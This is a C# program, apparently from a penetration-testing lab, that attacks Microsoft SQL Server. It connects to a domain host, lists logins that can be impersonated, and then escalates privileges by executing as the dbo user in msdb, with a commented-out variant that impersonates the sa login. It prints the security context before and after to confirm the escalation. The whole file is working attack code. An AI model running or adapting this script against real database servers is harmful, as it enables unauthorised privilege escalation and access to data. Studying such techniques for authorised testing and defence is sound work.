using System;
using System.Data.SqlClient;

namespace MSSQL_relay
{
    class Program
    {
        static void Main
        (
            string[] args
        )
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            //Enumerate which logins allow impersonation
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while(reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }

            reader.Close();


            Console.WriteLine("Before Impersonation...");

            //Query the current user context
            String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();


            Console.WriteLine("After Impersonation...");

            //Impersonate sa
            //String executeas = "EXECUTE AS LOGIN = 'sa';";
            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Read();
            reader.Close();

            //Query the current user context
            /*
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();
            */

            //Query the user context using USER_NAME()
            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing in the context of: " + reader[0]);
            reader.Close();
            

            con.Close();
        }
    }
}
